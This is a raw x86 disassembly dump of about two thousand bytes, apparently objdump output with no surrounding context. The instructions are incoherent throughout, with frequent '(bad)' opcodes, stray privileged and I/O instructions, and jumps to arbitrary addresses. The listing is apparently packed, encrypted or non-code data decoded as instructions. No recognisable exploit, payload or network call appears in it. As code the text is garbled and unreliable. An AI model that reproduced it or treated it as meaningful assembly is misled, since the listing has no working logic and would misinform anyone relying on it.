  418364:	sub    bl,0x7d
  418367:	addr16 pusha 
  418369:	sbb    eax,0x4088c008
  41836e:	jno    0x41836d
  418370:	fidiv  WORD PTR [edi+0x3]
  418373:	aas    
  418374:	sti    
  418375:	test   al,0xc6
  418377:	jmp    0x12f20dff
  41837c:	lock and edx,esp
  41837f:	(bad)  
  418380:	pop    edi
  418381:	(bad)  
  418382:	retf   0xe9f6
  418385:	jmp    0x3816f831
  41838a:	sti    
  41838b:	add    eax,0x178ac8
  418390:	or     al,0x34
  418392:	cmp    eax,0x2c0bf6be
  418397:	add    al,0xc7
  418399:	icebp  
  41839a:	add    eax,0x27139fdf
  41839f:	or     eax,0x1c010758
  4183a4:	(bad)  
  4183a5:	jnp    0x4183b0
  4183a7:	call   0xd4c261f7
  4183ac:	mov    ecx,0x570723c2
  4183b1:	add    DWORD PTR [ecx-0x80],esp
  4183b4:	stos   DWORD PTR es:[edi],eax
  4183b5:	and    BYTE PTR ds:0xab832581,0x83
  4183bc:	stos   DWORD PTR es:[edi],eax
  4183bd:	jns    0x4183ae
  4183bf:	test   esi,ebp
  4183c1:	mov    ebp,0xe864b7
  4183c6:	mov    gs,edx
  4183c8:	sbb    eax,0x68048eb
  4183cd:	sub    al,ah
  4183cf:	or     al,0x8
  4183d1:	cmp    DWORD PTR [edx-0x20],esp
  4183d4:	cmp    eax,DWORD PTR [ebp-0x247c2a59]
  4183da:	adc    bh,dh
  4183dc:	xor    DWORD PTR [esi+0x4b7dff7b],ebp
  4183e2:	dec    BYTE PTR [esp+eax*2]
  4183e5:	(bad)  
  4183e6:	ja     0x41845b
  4183e8:	add    al,0x1e
  4183ea:	and    DWORD PTR [eax-0x484d57d2],edi
  4183f0:	aas    
  4183f1:	mov    al,0x80
  4183f3:	pop    esp
  4183f4:	xlat   BYTE PTR ds:[ebx]
  4183f5:	and    eax,DWORD PTR [esi]
  4183f7:	pop    ecx
  4183f8:	sub    BYTE PTR [edx],0xa4
  4183fb:	stos   DWORD PTR es:[edi],eax
  4183fc:	aas    
  4183fd:	(bad)  
  4183fe:	stc    
  4183ff:	jmp    0x36770bb5
  418404:	and    DWORD PTR [esp+eax*4],edi
  418407:	add    al,0xf0
  418409:	adc    BYTE PTR [ecx+0x8],ah
  41840c:	in     eax,dx
  41840d:	mov    ds:0x85e7d92e,al
  418412:	(bad)  
  418414:	xchg   edx,eax
  418415:	add    BYTE PTR [ebp-0xd],bl
  418418:	add    al,0x14
  41841a:	mov    bh,0x2f
  41841c:	and    BYTE PTR [esi+0x7fa603b],ch
  418422:	pop    ebx
  418423:	pop    edi
  418424:	sub    BYTE PTR [edi+eax*8],bl
  418427:	adc    esi,DWORD PTR [eax+eax*1-0x34dde342]
  41842e:	ficomp WORD PTR [ebx]
  418430:	dec    ecx
  418431:	jmp    0x83fb:0xfa75cb5f
  418438:	jg     0x418440
  41843a:	add    eax,0x63bd75d2
  41843f:	or     BYTE PTR [esi-0x7f6ec19],ch
  418445:	add    al,0xe3
  418447:	push   cs
  418448:	jl     0x4183cb
  41844a:	cmp    esi,DWORD PTR [eax+0x3d]
  41844d:	jno    0x41844e
  41844f:	mov    ch,0x82
  418451:	jecxz  0x4184ce
  418453:	in     eax,dx
  418454:	nop
  418455:	sti    
  418456:	fbstp  TBYTE PTR [ecx]
  418458:	js     0x4184b6
  41845a:	iret   
  41845b:	lods   eax,DWORD PTR ds:[esi]
  41845c:	icebp  
  41845d:	jge    0x4184da
  41845f:	dec    ecx
  418460:	mov    edx,0x671dddf
  418465:	dec    eax
  418466:	gs nop
  418468:	or     BYTE PTR [ecx+ecx*1],ah
  41846b:	adc    al,0xba
  41846d:	fld    st(3)
  41846f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418470:	int    0x97
  418472:	pop    ds
  418473:	enter  0x8440,0xf8
  418477:	xor    edx,DWORD PTR [ecx]
  418479:	adc    al,al
  41847b:	inc    ebx
  41847c:	inc    esp
  41847d:	and    al,0x12
  41847f:	jge    0x4184ce
  418481:	jb     0x4184e0
  418483:	xchg   ebx,eax
  418484:	rcr    DWORD PTR [edi],0xb7
  418487:	pop    ds
  418488:	stc    
  418489:	xchg   DWORD PTR [esi-0x7e83f5c0],edi
  41848f:	ret    0x80d7
  418492:	mov    esi,0x73f02c6f
  418497:	jecxz  0x41845a
  418499:	icebp  
  41849a:	add    edx,DWORD PTR [esi-0x7d]
  41849d:	adc    ecx,DWORD PTR [eax]
  41849f:	mov    ds:0xd771ccf0,eax
  4184a4:	daa    
  4184a5:	mov    al,BYTE PTR [eax-0x48]
  4184a8:	add    al,0x20
  4184aa:	jl     0x41850d
  4184ac:	ja     0x41851b
  4184ae:	iret   
  4184af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184b0:	ja     0x41852f
  4184b2:	jmp    0x418456
  4184b4:	inc    edi
  4184b5:	cs (bad) 
  4184b7:	xor    eax,0xc3407b1c
  4184bc:	sti    
  4184bd:	inc    esp
  4184be:	and    ah,BYTE PTR [esi+edi*8+0xc93e1bd]
  4184c5:	clc    
  4184c6:	xlat   BYTE PTR ds:[ebx]
  4184c7:	jo     0x4184c3
  4184c9:	sti    
  4184ca:	pop    esp
  4184cb:	(bad)  
  4184cc:	sti    
  4184cd:	xor    esi,0x8
  4184d0:	mov    esp,0x23d0ba36
  4184d5:	es gs inc eax
  4184d8:	shl    edi,cl
  4184da:	sub    al,0x17
  4184dc:	mov    edi,0x1a4f8aad
  4184e1:	xchg   edx,eax
  4184e2:	call   0x8a41ce42
  4184e7:	sbb    BYTE PTR [eax+0x2a],0xfe
  4184eb:	jmp    0x2165c0f7
  4184f0:	fiadd  WORD PTR [edi+0x221e0090]
  4184f6:	pushf  
  4184f7:	jp     0x4184e6
  4184f9:	jne    0x4184c4
  4184fb:	div    ecx
  4184fd:	and    eax,0x329700fc
  418502:	and    al,bl
  418504:	add    eax,DWORD PTR [ecx]
  418506:	aas    
  418507:	lock dec ebp
  418509:	arpl   WORD PTR [edi+ecx*8+0xeefa954],di
  418510:	cmp    BYTE PTR [esi],cl
  418512:	fdivr  DWORD PTR [esi-0xc]
  418515:	cmp    al,0xf8
  418517:	sub    al,0x18
  418519:	mov    eax,0x9e3a34fb
  41851e:	xor    BYTE PTR [ebx],bh
  418520:	jle    0x4184d2
  418522:	xor    eax,edx
  418524:	rol    cl,1
  418526:	outs   dx,BYTE PTR ds:[esi]
  418527:	imul   esp,DWORD PTR [eax],0x766810b6
  41852d:	loope  0x4184ea
  41852f:	and    eax,0x683f6981
  418534:	cmp    eax,0xe42faa48
  418539:	xchg   esi,eax
  41853a:	jg     0x4184fb
  41853c:	outs   dx,BYTE PTR ds:[esi]
  41853d:	fist   WORD PTR ds:0xd9fdc111
  418543:	jge    0x418538
  418545:	aas    
  418546:	and    BYTE PTR [eax-0x30406340],dl
  41854c:	mov    ebp,0xd0736e09
  418551:	call   0x5df:0x52abf7f0
  418558:	adc    bh,BYTE PTR [eax+0x31]
  41855b:	adc    al,BYTE PTR [ebp+0x5]
  41855e:	leave  
  41855f:	mov    dl,0x5e
  418561:	std    
  418562:	pop    ss
  418563:	aas    
  418564:	cld    
  418565:	inc    edx
  418566:	hlt    
  418567:	add    DWORD PTR [esi],ecx
  418569:	dec    ecx
  41856a:	mov    bh,dh
  41856c:	and    DWORD PTR [eax+eax*4],esp
  41856f:	xchg   DWORD PTR [edi+edi*2-0x1ccc420e],eax
  418576:	xor    al,0xaa
  418578:	iret   
  418579:	test   eax,0x5624df6a
  41857e:	xchg   ebp,eax
  41857f:	sti    
  418580:	cmp    DWORD PTR [ebx+0x41],0xfffffff4
  418584:	pop    ebx
  418585:	or     cl,ah
  418587:	ja     0x4185e8
  418589:	add    BYTE PTR [edx+0x52a0203],bh
  41858f:	sbb    dh,BYTE PTR [ecx-0x40]
  418592:	in     al,0xf
  418594:	lods   al,BYTE PTR ds:[esi]
  418595:	test   DWORD PTR [eax-0x4e],eax
  418598:	test   ebx,ebp
  41859a:	or     edi,DWORD PTR [esi]
  41859c:	fdivp  st(6),st
  41859e:	loopne 0x4185bc
  4185a0:	outs   dx,DWORD PTR ds:[esi]
  4185a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185a2:	das    
  4185a3:	mov    esp,0x40f991f8
  4185a8:	dec    eax
  4185a9:	and    DWORD PTR [eax-0x62],0xfffffffb
  4185ad:	sub    eax,0x4c17b584
  4185b2:	in     al,dx
  4185b3:	out    dx,eax
  4185b4:	jmp    0x418613
  4185b6:	dec    ebx
  4185b7:	out    dx,al
  4185b8:	pop    edi
  4185b9:	das    
  4185ba:	mov    al,0x68
  4185bc:	sbb    BYTE PTR [eax],dh
  4185be:	jmp    0x418543
  4185c0:	sti    
  4185c1:	push   edx
  4185c2:	xchg   esp,eax
  4185c3:	mov    esi,0x2373d225
  4185c8:	xor    BYTE PTR [esi-0x30],0x27
  4185cc:	mov    ebx,0xf85fb341
  4185d1:	push   ss
  4185d2:	inc    ecx
  4185d3:	iret   
  4185d4:	sbb    dh,BYTE PTR [eax-0x20e4ccc6]
  4185da:	js     0x4185d3
  4185dc:	lds    eax,FWORD PTR [edi]
  4185de:	xor    BYTE PTR [ecx+eiz*1],bl
  4185e1:	dec    BYTE PTR [esp+eax*4]
  4185e4:	add    al,0xf0
  4185e6:	nop
  4185e7:	mov    al,ds:0x8417e91b
  4185ec:	gs out 0x84,eax
  4185ef:	in     al,0x5
  4185f1:	mov    ebx,0x7f83f084
  4185f6:	push   edx
  4185f7:	pop    edi
  4185f8:	sub    BYTE PTR [edi+edi*1],bl
  4185fb:	add    eax,0x73ede486
  418600:	jmp    0xdbc595f4
  418605:	jbe    0x418683
  418607:	jg     0x418648
  418609:	adc    BYTE PTR [edx-0x49],al
  41860c:	mov    edi,0xea4d7d75
  418611:	je     0x41860e
  418613:	lahf   
  418614:	(bad)  
  418616:	popa   
  418617:	loopne 0x4185d4
  418619:	pop    es
  41861a:	ret    0x81c
  41861d:	mov    ah,0x10
  41861f:	loopne 0x418619
  418621:	jmp    0x86f824e0
  418626:	sahf   
  418627:	xchg   si,ax
  418629:	adc    al,0x8f
  41862b:	add    al,0x1c
  41862d:	mov    ebx,0x5b65dff
  418632:	clc    
  418633:	sbb    bh,BYTE PTR [edi+0x7740c17]
  418639:	fcomp  QWORD PTR [eax-0x3e7ec8ff]
  41863f:	js     0x4185c5
  418641:	out    dx,eax
  418642:	push   0x4
  418644:	xor    eax,0x1737e10
  418649:	out    dx,eax
  41864a:	mov    ebp,0x2033578b
  41864f:	lock cli 
  418651:	dec    ecx
  418652:	push   cs
  418653:	loop   0x41865e
  418655:	add    dl,BYTE PTR [ecx+eiz*2+0xb]
  418659:	pop    ecx
  41865a:	push   edx
  41865b:	pop    edi
  41865c:	std    
  41865d:	mov    dh,0x7
  41865f:	and    eax,esp
  418661:	lahf   
  418662:	mov    DWORD PTR [eax+0x4a121e00],edx
  418668:	retf   
  418669:	dec    ebx
  41866a:	scas   eax,DWORD PTR es:[edi]
  41866b:	imul   ebx,esi,0xffffffea
  41866e:	fstp   TBYTE PTR ds:0xc5072f2d
  418674:	cmp    eax,0x914c407e
  418679:	mov    eax,0x3f46b03f
  41867e:	and    eax,0xfb279c16
  418683:	test   al,ah
  418685:	clc    
  418686:	xchg   ecx,eax
  418687:	mul    DWORD PTR [eax-0x39]
  41868a:	mov    al,ds:0x10c41cc9
  41868f:	cmp    BYTE PTR [ebp-0x3f],0xff
  418693:	adc    DWORD PTR [esi+0x5],0x3
  418697:	add    DWORD PTR [edx],edi
  418699:	xlat   BYTE PTR ds:[ebx]
  41869a:	(bad)
  41869e:	add    esi,DWORD PTR [eax-0x43]
  4186a1:	jecxz  0x41871b
  4186a3:	lahf   
  4186a4:	dec    edi
  4186a5:	pop    ds
  4186a6:	cwde   
  4186a7:	cld    
  4186a8:	add    DWORD PTR [ebx-0x7],ebp
  4186ab:	(bad)  
  4186ad:	pop    eax
  4186ae:	hlt    
  4186af:	loop   0x4186c0
  4186b1:	sbb    DWORD PTR [eax],0x74
  4186b4:	adc    DWORD PTR [edx-0x12],edi
  4186b7:	(bad)  
  4186b8:	(bad)  
  4186b9:	jmp    0x51ba:0xdf443865
  4186c0:	push   es
  4186c1:	add    al,BYTE PTR [ebx+0x33f0ae]
  4186c7:	mov    dl,0x67
  4186c9:	add    DWORD PTR [eax-0x932c7f6],ebp
  4186cf:	jmp    0x418710
  4186d1:	(bad)  
  4186d2:	cmp    eax,0xb5a4e10b
  4186d7:	xchg   DWORD PTR [eax+edx*4+0x7e021e00],eax
  4186de:	div    bl
  4186e0:	xchg   ebx,eax
  4186e1:	push   ecx
  4186e2:	push   ebp
  4186e3:	je     0x418744
  4186e5:	or     DWORD PTR [ebx+ebx*8-0x40],ecx
  4186e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186ea:	push   ebp
  4186eb:	adc    al,0x4f
  4186ed:	mov    ds:0xb667aebb,eax
  4186f2:	idiv   DWORD PTR [edx+eiz*2-0x49]
  4186f6:	scas   eax,DWORD PTR es:[edi]
  4186f7:	ins    DWORD PTR es:[edi],dx
  4186f8:	add    eax,0x981fbf9e
  4186fd:	iret   
  4186fe:	loopne 0x418691
  418700:	sub    BYTE PTR [edi+esi*8],0xad
  418704:	add    eax,0xeb900be8
  418709:	idiv   ch
  41870b:	jo     0x418756
  41870d:	clc    
  41870e:	mov    ecx,0xe7efa77c
  418713:	mul    DWORD PTR [edx+0x0]
  418716:	into   
  418717:	add    BYTE PTR [eax+0x7],0xd7
  41871b:	jbe    0x418723
  41871d:	jl     0x418792
  41871f:	push   es
  418720:	int3   
  418721:	std    
  418722:	rcl    DWORD PTR [edi+0x6b3d537f],0x22
  418729:	clc    
  41872a:	lds    eax,FWORD PTR [ecx+ebx*4]
  41872d:	lea    eax,[ecx]
  41872f:	xchg   edi,eax
  418730:	xor    BYTE PTR fs:[esi-0x40ca1c30],ch
  418737:	xadd   BYTE PTR [ebx+0x7ee49043],ch
  41873e:	lahf   
  41873f:	or     BYTE PTR [edi],bh
  418741:	and    al,BYTE PTR ss:0x29641ddf
  418748:	jl     0x4186fc
  41874a:	nop
  41874b:	and    eax,0xf5170e10
  418750:	push   0x37b7e2ec
  418755:	and    ah,BYTE PTR [ecx]
  418757:	(bad)  
  418758:	sub    al,0x84
  41875a:	add    al,0xf0
  41875c:	adc    BYTE PTR [eax+0x26bd9b19],dl
  418762:	ja     0x418750
  418764:	jns    0x4187b3
  418766:	repz mov ds:0x9a048ad9,al
  41876c:	not    DWORD PTR [esi+ebp*4-0xda3cba2]
  418773:	out    0xbf,eax
  418775:	retf   
  418776:	add    DWORD PTR [edx+0x46],0x5f
  41877a:	fild   DWORD PTR [ebx]
  41877d:	sbb    BYTE PTR cs:[ebx],0x8
  418781:	xor    eax,0x7a03eaf4
  418786:	es aas 
  418788:	adc    ch,0x17
  41878b:	clc    
  41878c:	push   ds
  41878d:	push   ecx
  41878e:	jo     0x41880f
  418790:	or     eax,0x6100c381
  418795:	add    al,0xd6
  418797:	test   BYTE PTR [edi+ecx*2-0x38],al
  41879b:	jnp    0x4187fe
  41879d:	add    esi,DWORD PTR [edi+0x20]
  4187a0:	loopne 0x418769
  4187a2:	sti    
  4187a3:	or     BYTE PTR [edx+eiz*4-0x1dc257d1],0x1a
  4187ab:	or     al,0x28
  4187ad:	push   es
  4187ae:	xchg   DWORD PTR [esi],ecx
  4187b0:	push   0xf88f1ef8
  4187b5:	std    
  4187b6:	loopne 0x41879a
  4187b8:	lahf   
  4187b9:	jecxz  0x41875a
  4187bb:	imul   edi,DWORD PTR [ebx-0x2848c03],0xffffff82
  4187c2:	pop    ds
  4187c3:	das    
  4187c4:	xchg   ecx,eax
  4187c5:	inc    ecx
  4187c6:	cmp    BYTE PTR [ebp-0x38b4cb8],bl
  4187cc:	shl    BYTE PTR [edi-0x41ded7c3],cl
  4187d2:	and    eax,0x8780242
  4187d7:	cmp    BYTE PTR [ecx-0x552c1c85],bh
  4187dd:	out    0x78,al
  4187df:	mov    edi,0x64b25f7b
  4187e4:	jg     0x418810
  4187e6:	jo     0x418837
  4187e8:	xchg   ebx,eax
  4187e9:	inc    edx
  4187ea:	das    
  4187eb:	stos   BYTE PTR es:[edi],al
  4187ec:	aas    
  4187ed:	sub    BYTE PTR [eax-0x9a02bbf],ch
  4187f3:	fild   WORD PTR [edi]
  4187f5:	xchg   ebp,eax
  4187f6:	adc    eax,0x17
  4187f9:	fcomp  QWORD PTR [esi+0x405f4f89]
  4187ff:	cmp    DWORD PTR [ecx+0x5],0xffffff81
  418803:	(bad)  
  418804:	pop    ss
  418805:	mov    esi,0xc2dbd17b
  41880a:	jge    0x4187dd
  41880c:	neg    DWORD PTR [esi-0x4]
  41880f:	and    DWORD PTR [eax+0x647dc10],edi
  418815:	sar    DWORD PTR [ebp-0x3f528fc],0xfa
  41881c:	shr    BYTE PTR [edx+0x8],0x52
  418820:	mov    es,WORD PTR [ecx-0x65]
  418823:	add    al,0x62
  418826:	pusha  
  418827:	or     al,BYTE PTR [esi+ebp*1]
  41882a:	dec    edx
  41882b:	out    dx,eax
  41882c:	jp     0x4187ec
  41882e:	shl    bh,0x88
  418831:	xchg   BYTE PTR [esi+0x14808bd0],bh
  418837:	pop    es
  418838:	mov    dh,0x8a
  41883a:	in     al,0xfd
  41883c:	cmp    BYTE PTR [ebx],ah
  41883e:	sbb    dh,BYTE PTR [edx+ecx*1-0x801100b]
  418845:	sbb    eax,0x76ff108b
  41884a:	test   BYTE PTR [eax+esi*8],al
  41884d:	xor    cl,0xab
  418850:	jg     0x41884f
  418852:	inc    ebx
  418853:	adc    ch,BYTE PTR [ebp+0x48a07fee]
  418859:	jge    0x41887c
  41885b:	push   ecx
  41885c:	fs aas 
  41885e:	aad    0x36
  418860:	and    BYTE PTR [eax+esi*1+0x440fbbe0],bh
  418867:	fadd   QWORD PTR [ebx+0x541a7be3]
  41886d:	js     0x41889d
  41886f:	inc    ecx
  418870:	push   eax
  418871:	cmp    bh,BYTE PTR [edi+ebx*4+0x2f]
  418875:	push   ds
  418876:	and    BYTE PTR [eax],bh
  418878:	lahf   
  418879:	jle    0x4188db
  41887b:	xor    BYTE PTR [eax+0x7cfe033],al
  418881:	pop    ecx
  418882:	add    ah,bh
  418884:	sbb    BYTE PTR [eax-0x70],al
  418887:	call   DWORD PTR [edi]
  418889:	xchg   edx,eax
  41888a:	dec    edi
  41888b:	and    cl,al
  41888d:	cmp    DWORD PTR [ecx+0x740beeaf],eax
  418893:	inc    eax
  418894:	xor    al,BYTE PTR [ecx+0x41]
  418897:	iret   
  418898:	jge    0x4188fe
  41889a:	loop   0x41885b
  41889c:	add    BYTE PTR [edx-0x5b811f5e],0x41
  4188a3:	push   edx
  4188a4:	rcr    bl,0xca
  4188a7:	mov    dl,0x27
  4188a9:	loopne 0x418835
  4188ab:	aam    0x6f
  4188ad:	dec    ebx
  4188ae:	das    
  4188af:	xor    eax,DWORD PTR [ecx+0x3f48315f]
  4188b5:	sbb    BYTE PTR [edx],ch
  4188b7:	retf   
  4188b8:	mov    al,ds:0x9bb6e0aa
  4188bd:	xlat   BYTE PTR ds:[ebx]
  4188be:	jg     0x4188a1
  4188c0:	aas    
  4188c1:	jl     0x418929
  4188c3:	in     al,0xdb
  4188c5:	sbb    ebx,DWORD PTR [ecx+0x210adf10]
  4188cb:	add    DWORD PTR [eax+eiz*2],edi
  4188ce:	sbb    al,0xdd
  4188d0:	pop    eax
  4188d1:	ds scas eax,DWORD PTR es:[edi]
  4188d3:	pop    edx
  4188d4:	(bad)  
  4188d5:	retf   
  4188d6:	xchg   edx,eax
  4188d7:	outs   dx,DWORD PTR ds:[esi]
  4188d8:	ret    0x92ca
  4188db:	xchg   edi,eax
  4188dc:	rcl    DWORD PTR [esi+0x6],cl
  4188df:	or     al,BYTE PTR [eax-0x8241022]
  4188e5:	add    DWORD PTR es:[ecx-0x3],ecx
  4188e9:	xor    bl,BYTE PTR [ecx-0x29]
  4188ec:	jmp    0x3fb5348
  4188f1:	add    dl,ch
  4188f3:	mov    edi,DWORD PTR [edi+eax*1+0x2fd1685f]
  4188fa:	fcomp  DWORD PTR [ecx]
  4188fc:	hlt    
  4188fd:	mov    ds:0x60d60be9,eax
  418902:	sub    al,0x2
  418904:	mov    al,ds:0xc8311337
  418909:	dec    eax
  41890a:	cmp    BYTE PTR [ebp+0x2],bh
  41890d:	jmp    0x38fd:0xf7a51605
  418914:	les    eax,FWORD PTR [eax]
  418916:	pop    ecx
  418917:	or     al,0x56
  418919:	adc    BYTE PTR [esi],al
  41891b:	ins    DWORD PTR es:[edi],dx
  41891c:	or     bl,BYTE PTR [edi+eax*1+0x1]
  418920:	enter  0xc7f7,0x3
  418924:	add    ch,BYTE PTR [ebx+0x43881ec5]
  41892a:	hlt    
  41892b:	cmp    al,0x1f
  41892d:	call   FWORD PTR [edi]
  41892f:	inc    ebp
  418930:	out    dx,al
  418931:	imul   edi,DWORD PTR [ebp+0x45],0xffffffea
  418935:	test   DWORD PTR ds:0x1ed58402,0x7c6d6e2a
  41893f:	hlt    
  418940:	fistp  DWORD PTR ds:0x26ff109b
  418946:	inc    edx
  418947:	add    bh,BYTE PTR [eax-0x40]
  41894a:	push   eax
  41894b:	push   ebp
  41894c:	icebp  
  41894d:	mov    dl,0x84
  41894f:	arpl   si,si
  418951:	mov    ds:0x1d1af8df,al
  418956:	outs   dx,DWORD PTR ds:[esi]
  418957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418958:	pop    esp
  418959:	push   eax
  41895a:	leave  
  41895b:	pop    ss
  41895c:	clc    
  41895d:	mov    DWORD PTR [ecx-0x26be037],0x7dfb0a0e
  418967:	jne    0x41895e
  418969:	jle    0x41894c
  41896b:	or     eax,0xe0ed5941
  418970:	xor    DWORD PTR [ebx],eax
  418972:	sbb    DWORD PTR [edx],eax
  418974:	xlat   BYTE PTR ds:[ebx]
  418975:	cmc    
  418976:	lods   al,BYTE PTR ds:[esi]
  418977:	(bad)  
  418978:	rcl    bh,0x86
  41897b:	jle    0x4188fd
  41897d:	cs rcr al,1
  418980:	neg    DWORD PTR [ecx-0x5b85c114]
  418986:	add    DWORD PTR [edi+0xe],0x9480cd8e
  41898d:	shl    BYTE PTR [edi],cl
  41898f:	push   ds
  418990:	(bad)  
  418992:	call   0xf745bd6c
  418997:	and    ch,dh
  418999:	test   DWORD PTR [ebx+0x3f7c8f5f],edi
  41899f:	or     esp,esi
  4189a1:	dec    edx
  4189a2:	test   DWORD PTR [ecx],eax
  4189a4:	xor    DWORD PTR [eax+0x5bc081fe],esi
  4189aa:	pop    ss
  4189ab:	mov    al,ds:0x9fae2f77
  4189b0:	sub    eax,0xd5401fa1
  4189b5:	xor    eax,0x7c0aac3d
  4189ba:	or     BYTE PTR [eax],cl
  4189bc:	or     eax,esp
  4189be:	add    DWORD PTR [ebx+0x57],eax
  4189c1:	aam    0xd7
  4189c3:	add    ecx,DWORD PTR [ebp+0x6f]
  4189c6:	sti    
  4189c7:	inc    edx
  4189c8:	adc    al,0xac
  4189ca:	add    al,0xa4
  4189cc:	enter  0x4e7e,0x9c
  4189d0:	add    DWORD PTR [edi-0x40],edx
  4189d3:	cmc    
  4189d4:	sub    al,0x5
  4189d6:	jnp    0x418998
  4189d8:	mov    edi,gs
  4189da:	xchg   ebp,eax
  4189db:	stc    
  4189dc:	cli    
  4189dd:	call   0xef8b9737
  4189e2:	xor    esi,DWORD PTR [ebp+0xc1417a1]
  4189e8:	push   edx
  4189e9:	jnp    0x4189bd
  4189eb:	and    BYTE PTR [eax],0xca
  4189ee:	cmp    DWORD PTR [esi+0x23f080fb],0xffffffe8
  4189f5:	dec    ebp
  4189f6:	(bad)  ds:0xb62fbdce
  4189fc:	xor    BYTE PTR [eax+0xa],dl
  4189ff:	jl     0x4189e0
  418a01:	jge    0x418a33
  418a03:	adc    BYTE PTR [edi-0x40],cl
  418a06:	jmp    FWORD PTR [esi]
  418a08:	addr16 pusha 
  418a0a:	addr16 jo 0x4189fa
  418a0d:	xor    BYTE PTR [ecx-0x7e],0xfb
  418a11:	jne    0x418a02
  418a13:	aas    
  418a14:	pop    edi
  418a15:	xchg   edx,eax
  418a16:	call   0x32bdaf82
  418a1b:	xor    esp,DWORD PTR [edi+ebp*4+0x5f]
  418a1f:	in     al,0x1
  418a21:	aaa    
  418a22:	and    ecx,DWORD PTR [eax+0x742a6809]
  418a28:	dec    esi
  418a29:	dec    ebx
  418a2a:	pop    ds
  418a2b:	sti    
  418a2c:	daa    
  418a2d:	fbstp  TBYTE PTR [edi]
  418a2f:	push   ds
  418a30:	stc    
  418a31:	ja     0x4189c2
  418a33:	inc    eax
  418a34:	mov    BYTE PTR [edi],bh
  418a36:	cmovb  eax,DWORD PTR [edx]
  418a39:	js     0x4189bb
  418a3b:	clc    
  418a3c:	jmp    0xed897090
  418a41:	rcl    DWORD PTR [ebx-0x4680dae9],cl
  418a47:	das    
  418a48:	aad    0xdf
  418a4a:	dec    edx
  418a4b:	repnz shr BYTE PTR [eax+edi*1+0x5f],0x48
  418a51:	jnp    0x418a86
  418a53:	jmp    0x41b60c5e
  418a58:	mov    edx,0x7a0b702c
  418a5d:	adc    edi,DWORD PTR [esi+eax*1-0x3]
  418a61:	ins    BYTE PTR es:[edi],dx
  418a62:	pop    edi
  418a63:	cwde   
  418a64:	jp     0x418a8c
  418a66:	js     0x418a48
  418a68:	push   cs
  418a69:	or     al,0x8
  418a6b:	das    
  418a6c:	hlt    
  418a6d:	sub    eax,0xc1ffe08a
  418a72:	bound  ebx,QWORD PTR [edi+0x7dff48c1]
  418a78:	lahf   
  418a79:	add    eax,0x1c7fe6f7
  418a7e:	in     al,dx
  418a7f:	push   cs
  418a80:	scas   al,BYTE PTR es:[edi]
  418a81:	fnstenv [ebx]
  418a83:	fild   WORD PTR [edi]
  418a85:	lods   al,BYTE PTR ds:[esi]
  418a86:	(bad)  
  418a87:	fiadd  WORD PTR [ebp+eiz*1-0x21]
  418a8b:	adc    dh,BYTE PTR [ecx-0x3]
  418a8e:	imul   eax,esp,0x631c60d2
  418a94:	rcr    BYTE PTR [edx+0x18],0x24
  418a98:	mov    cl,0xe0
  418a9a:	jnp    0x418b16
  418a9c:	jne    0x418a9e
  418a9e:	hlt    
  418a9f:	iret   
  418aa0:	or     edx,ebx
  418aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aa3:	dec    eax
  418aa4:	sahf   
  418aa5:	inc    ebp
  418aa6:	and    esi,DWORD PTR [ebp-0x13]
  418aa9:	pop    ecx
  418aaa:	mov    bh,0xad
  418aac:	aas    
  418aad:	sti    
  418aae:	out    0x1e,eax
  418ab0:	xchg   esp,eax
  418ab1:	adc    bh,bh
  418ab3:	push   esi
  418ab4:	test   BYTE PTR [eax+esi*8],al
  418ab7:	add    BYTE PTR [ecx-0x4d4c25e5],ah
  418abd:	arpl   di,sp
  418abf:	xor    DWORD PTR [edx+0x57],0x21
  418ac3:	mov    esp,0xb97ac025
  418ac8:	jb     0x418b29
  418aca:	sti    
  418acb:	fisttp DWORD PTR [esi+0x3c234667]
  418ad1:	add    DWORD PTR [edx],ecx
  418ad3:	dec    edx
  418ad4:	add    DWORD PTR [edi],0xe6836753
  418ada:	jmp    DWORD PTR [eax+0x62818bf0]
  418ae0:	call   0x7c3:0x4f402cc1
  418ae7:	fist   WORD PTR ds:0x7c06ff04
  418aed:	cmc    
  418aee:	ror    BYTE PTR ds:0xfd01a5e8,0xf9
  418af5:	add    eax,0xc417dfd0
  418afa:	sbb    eax,0x602f37a
  418aff:	pop    esp
  418b00:	lea    esp,[eax]
  418b02:	into   
  418b03:	jo     0x418b64
  418b05:	sub    dl,BYTE PTR [eax-0xc]
  418b08:	scas   eax,DWORD PTR es:[edi]
  418b09:	das    
  418b0a:	and    al,0xaf
  418b0c:	mov    dl,BYTE PTR [eax-0x8]
  418b0f:	(bad)  
  418b11:	push   es
  418b12:	cs mov ebp,eax
  418b15:	pop    es
  418b16:	rcl    DWORD PTR ss:[ebx],0xf8
  418b1a:	mov    al,ds:0x78beefe2
  418b1f:	mov    ah,dl
  418b21:	mov    bh,0x8e
  418b23:	xchg   esp,eax
  418b24:	call   FWORD PTR [edi-0x6df30843]
  418b2a:	in     eax,dx
  418b2b:	shr    dh,0xfb
  418b2e:	jle    0x418b67
  418b30:	je     0x418b11
  418b32:	into   
  418b33:	cmp    DWORD PTR [ebp-0x31],ecx
  418b36:	je     0x418b87
  418b38:	sahf   
  418b39:	xchg   edi,eax
  418b3a:	add    BYTE PTR [edi],0x60
  418b3d:	mov    cl,0xc0
  418b3f:	bound  esi,QWORD PTR [ecx+0x2281b979]
  418b45:	ja     0x418b60
  418b47:	ins    BYTE PTR es:[edi],dx
  418b48:	push   ecx
  418b49:	sub    bl,bl
  418b4b:	gs fwait
  418b4d:	scas   al,BYTE PTR es:[edi]
  418b4e:	(bad)  
  418b4f:	fstp   DWORD PTR [edi+0x54]
  418b52:	xor    ch,BYTE PTR [ecx-0x69ea5bf1]
  418b58:	ss inc ebp
  418b5a:	push   edx
  418b5b:	xchg   esi,eax
  418b5c:	imul   edx,DWORD PTR [ebp+0x5972c902],0x25d16655
  418b66:	pop    ebx
  418b67:	mov    eax,ds:0x45960fc8
  418b6c:	pop    ss
  418b6d:	and    eax,0x6291652
  418b72:	mov    ebx,edx
  418b74:	and    eax,0x38bc0176
  418b79:	outs   dx,DWORD PTR ds:[esi]
  418b7a:	jb     0x418b66
  418b7c:	sahf   
  418b7d:	cdq    
  418b7e:	into   
  418b7f:	cmp    esp,ebx
  418b81:	call   0xee310895
